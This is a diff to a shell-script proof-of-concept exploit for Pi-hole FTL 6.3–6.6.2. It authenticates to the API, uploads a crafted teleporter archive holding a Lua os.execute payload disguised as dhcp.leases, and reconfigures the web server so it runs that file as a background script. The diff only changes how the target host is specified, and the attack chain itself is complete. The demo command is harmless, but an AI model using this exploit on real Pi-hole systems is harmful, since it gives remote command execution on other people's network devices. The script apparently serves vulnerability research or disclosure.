@@ -15,12 +15,12 @@
 # works on FTL 6.3 - 6.6.2
 #
 PIPASS="password"
-PIHOST="192.168.1.1"
+PIHOST="http://pi.hole"
 CMD="id > /tmp/exec-proof; grep Cap /proc/self/status >> /tmp/exec-proof"
 
 set -eu
 # Login (skip in no-password mode)
-SID="$( curl -sk -X POST http://${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
+SID="$( curl -sk -X POST "${PIHOST}/api/auth" -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
 if [ "${SID}x" == "x" ];then
   echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
   exit 1
@@ -32,7 +32,7 @@ printf "os.execute(\"%s\")" "$CMD" > dhcp.leases
 tar -zcf teleport.dhcp.tar.gz dhcp.leases
 
 # POST the crafted .tar.gz to teleport (can skip this if you staged it locally already)
-res="$( curl -sk -H "X-FTL-SID: $SID" -X POST http://${PIHOST}/api/teleporter -F "file=@teleport.dhcp.tar.gz" )"
+res="$( curl -sk -H "X-FTL-SID: $SID" -X POST "${PIHOST}/api/teleporter" -F "file=@teleport.dhcp.tar.gz" )"
 resfiles="$( echo "${res}" | jq -r .files.[0] )"
 if [ "${resfiles}" == "/etc/pihole/dhcp.leases" ];then
   echo "[+] staged /etc/pihole/dhcp.leases on pihole host"
@@ -43,7 +43,7 @@ fi
 # Script is staged (/etc/pihole/dhcp.leases)
 
 # Point advancedOpts lua_background_script at it
-res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH http://${PIHOST}/api/config -H 'Content-Type: application/json' \
+res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H 'Content-Type: application/json' \
      -d '{"config":{"webserver":{"advancedOpts":["lua_background_script=/etc/pihole/dhcp.leases"]}}}' 2>/dev/null )"
 resopts="$( echo "${res}" | jq -r ".config.webserver.advancedOpts.[0]" )"
 
